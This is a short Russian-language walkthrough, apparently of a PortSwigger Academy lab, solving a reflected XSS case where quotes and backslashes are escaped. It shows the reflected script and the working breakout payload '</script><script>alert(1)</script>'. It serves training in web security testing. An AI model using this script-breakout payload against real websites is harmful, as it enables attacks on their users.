зайдем на уязвимый ресурс

и в поисковой строке выполним поиск по `test`
Найдем в бурпе ответ на данный запрос и увидим интересность
```
<script>
  var searchTerms = 'test';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/20.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/pics%20for%20walkthrough/1.png)
Попробуем выйти из данного цикла

Если мы введем в запрос `test'set` то увидим экранирование `'` на `'/`
```
<script>
  var searchTerms = 'test\'set';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/20.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/pics%20for%20walkthrough/2.png)

Введем
```
</script><script>alert(1)</script>
```
чтобы выйти из скрипта заранее
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/20.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/pics%20for%20walkthrough/3.png)
и получим отработанный XSS скрипт и уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/20.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/pics%20for%20walkthrough/4.png)
